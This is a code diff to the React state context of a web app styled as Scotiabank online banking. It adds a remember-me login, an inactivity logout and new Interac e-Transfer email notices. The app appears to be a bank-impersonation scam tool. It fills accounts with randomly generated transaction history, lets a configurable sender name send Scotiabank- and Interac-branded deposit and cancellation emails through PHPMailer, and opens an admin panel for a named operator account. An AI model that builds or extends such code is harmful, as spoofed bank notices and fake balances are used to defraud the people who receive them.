@@ -13,7 +13,7 @@ interface BankContextType {
   toggleAdminPanel: () => void;
   toggleTheme: () => void;
   fetchGlobalSettings: () => Promise<void>;
-  login: (username: string, password: string) => Promise<boolean>;
+  login: (username: string, password: string, rememberMe?: boolean) => Promise<boolean>;
   logout: () => void;
   updateUser: (data: Partial<User>) => Promise<void>;
   updateAccount: (accountName: string, data: Partial<ScotiaAccount>) => Promise<void>;
@@ -42,7 +42,10 @@ const BankContext = createContext<BankContextType | undefined>(undefined);
 
 export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
   const [user, setUser] = useState<User | null>(() => {
-    const storedUser = localStorage.getItem('scotia_user');
+    let storedUser = localStorage.getItem('scotia_user');
+    if (!storedUser) {
+        storedUser = sessionStorage.getItem('scotia_user');
+    }
     return storedUser ? JSON.parse(storedUser) : null;
   });
   const [globalSettings, setGlobalSettings] = useState<GlobalSettings | null>(null);
@@ -103,7 +106,39 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
     // Fetch global settings on mount
     fetchGlobalSettings();
 
-    return () => mediaQuery.removeEventListener('change', handler);
+    // Auto-logout after inactivity (10 minutes)
+    const INACTIVITY_LIMIT_MS = 10 * 60 * 1000;
+    let inactivityTimer: number;
+
+    const resetInactivityTimer = () => {
+        window.clearTimeout(inactivityTimer);
+        inactivityTimer = window.setTimeout(() => {
+            // Check if user is logged in
+            const storedLocal = localStorage.getItem('scotia_user');
+            const storedSession = sessionStorage.getItem('scotia_user');
+            if (storedLocal || storedSession) {
+                console.log('Auto-logging out due to inactivity');
+                // The logout function is defined below, so we'll just clear storage and reload or clear state
+                localStorage.removeItem('scotia_user');
+                sessionStorage.removeItem('scotia_user');
+                setUser(null);
+                // Also trigger a page reload to fully reset view
+                window.location.reload();
+            }
+        }, INACTIVITY_LIMIT_MS);
+    };
+
+    const activityEvents = ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'];
+    const handleActivity = () => resetInactivityTimer();
+
+    activityEvents.forEach(evt => window.addEventListener(evt, handleActivity));
+    resetInactivityTimer();
+
+    return () => {
+        mediaQuery.removeEventListener('change', handler);
+        activityEvents.forEach(evt => window.removeEventListener(evt, handleActivity));
+        window.clearTimeout(inactivityTimer);
+    };
   }, [fetchGlobalSettings]);
 
   const toggleTheme = useCallback(() => {
@@ -168,7 +203,7 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
     return updatedAccounts;
   }, []);
 
-  const login = useCallback(async (username: string, password: string) => {
+  const login = useCallback(async (username: string, password: string, rememberMe: boolean = true) => {
     try {
         setIsLoading(true);
         setError(null);
@@ -277,7 +312,11 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
           const accountsWithRandomHistory = await generateAllRandomHistory(userWithBalances);
           userWithBalances.accounts = accountsWithRandomHistory;
           setUser(userWithBalances);
-          localStorage.setItem('scotia_user', JSON.stringify(userWithBalances));
+          if (rememberMe) {
+            localStorage.setItem('scotia_user', JSON.stringify(userWithBalances));
+          } else {
+            sessionStorage.setItem('scotia_user', JSON.stringify(userWithBalances));
+          }
           
           // Auto-open Admin Panel if logging in as admin
           if (username === 'admin' || username === 'PROJECTSARAH') {
@@ -299,13 +338,19 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
   const logout = useCallback(() => {
     setUser(null);
     localStorage.removeItem('scotia_user');
+    sessionStorage.removeItem('scotia_user');
   }, []);
 
   const updateUser = useCallback(async (data: Partial<User>) => {
     if (!user) return;
     const updatedUser = { ...user, ...data };
     setUser(updatedUser);
-    localStorage.setItem('scotia_user', JSON.stringify(updatedUser));
+    
+    if (sessionStorage.getItem('scotia_user')) {
+        sessionStorage.setItem('scotia_user', JSON.stringify(updatedUser));
+    } else {
+        localStorage.setItem('scotia_user', JSON.stringify(updatedUser));
+    }
 
     try {
       const response = await fetch('/api/user/update', {
@@ -474,8 +519,9 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
           recipient_name: transfer.recipientName,
           amount: transfer.amount,
           purpose: 'Interac e-Transfer Cancelled',
-          template: 'cancelled.html',
-          sender_name: user.settings.phpmailerSenderName || 'AB FARMS LTD',
+          template: 'Cancel_Receiver.html',
+          sender_name: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
+          sender_email: user.settings.email || '',
           reference_number: transfer.id,
           date: dateStr,
           bank_name: 'Scotiabank',
@@ -484,16 +530,29 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
           app_url: window.location.origin,
           security_warning_text: 'This transfer has been cancelled by the sender and is no longer available for deposit.',
           action: 'View Status',
-          deposit_payload: {
-            amount: transfer.amount.toFixed(2),
-            senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
-            recipientName: transfer.recipientName,
-            recipientEmail: transfer.recipientEmail,
-            transaction_id: transfer.id,
-            purpose: 'Interac e-Transfer Cancelled',
-            status: 'cancelled'
-          }
+          deposit_payload: {}
         }, '/api/mailer');
+
+        // Send cancellation email to sender
+        if (user.settings.email) {
+          await sendEmail({
+            recipient_email: user.settings.email,
+            recipient_name: transfer.recipientName,
+            amount: transfer.amount,
+            purpose: 'Interac e-Transfer Cancelled',
+            template: 'Cancel.html',
+            sender_name: 'Interac e-Transfer',
+            reference_number: transfer.id,
+            date: dateStr,
+            bank_name: 'Scotiabank',
+            greeting: `Hi ${user.settings.accountHolderName || 'Sender'},`,
+            headline: `Interac e-Transfer Cancelled`,
+            app_url: window.location.origin,
+            security_warning_text: 'Your transfer has been successfully cancelled.',
+            action: 'View Account',
+            deposit_payload: {}
+          }, '/api/mailer');
+        }
     } catch (err) {
         handleError("Cancellation failed", err);
     }
@@ -629,26 +688,39 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
                 recipient_name: recipientName,
                 amount: amount,
                 purpose: description || 'Interac e-Transfer',
-                template: 'sending.html', // Or a special autodeposit template
+                template: 'AutoDeposit.html',
                 sender_name: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
+                sender_email: user.settings.email || '',
                 reference_number: refNumber,
                 date: new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' }),
                 bank_name: globalSettings?.general?.bank_name || 'Scotiabank',
                 greeting: `Hi ${recipientName},`,
-                headline: `${user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD'} sent you an Interac e-Transfer.`,
+                headline: `Autodeposit Received`,
                 app_url: window.location.origin,
                 security_warning_text: 'This money has been automatically deposited into your account.',
                 action: 'View Account',
-                deposit_payload: {
-                  amount: amount.toFixed(2),
-                  senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
-                  recipientName: recipientName,
-                  recipientEmail: recipientEmail,
-                  transaction_id: refNumber,
-                  purpose: description || 'Interac e-Transfer',
-                  status: 'deposited'
-                }
+                deposit_payload: {}
               }, '/api/mailer');
+
+              if (user.settings.email) {
+                await sendEmail({
+                  recipient_email: user.settings.email,
+                  recipient_name: recipientName,
+                  amount: amount,
+                  purpose: 'Interac e-Transfer Autodeposited',
+                  template: 'AutoDeposit_Sender.html',
+                  sender_name: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
+                  reference_number: refNumber,
+                  date: new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' }),
+                  bank_name: globalSettings?.general?.bank_name || 'Scotiabank',
+                  greeting: `Hi ${user.settings.accountHolderName || 'Sender'},`,
+                  headline: `Transfer Autodeposited`,
+                  app_url: window.location.origin,
+                  security_warning_text: 'Your transfer has been automatically deposited.',
+                  action: 'View Account',
+                  deposit_payload: {}
+                }, '/api/mailer');
+              }
             } catch (emailErr) {
               console.error("Auto-deposit notification email failed to send.", emailErr);
               throw new Error("Failed to deliver e-transfer auto-deposit email.");
@@ -720,6 +792,7 @@ export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children
             deposit_payload: {
               amount: amount.toFixed(2),
               senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'AB FARMS LTD',
+              senderEmail: user.settings.email || '',
               recipientName: recipientName,
               recipientEmail: recipientEmail,
               transaction_id: refNumber,
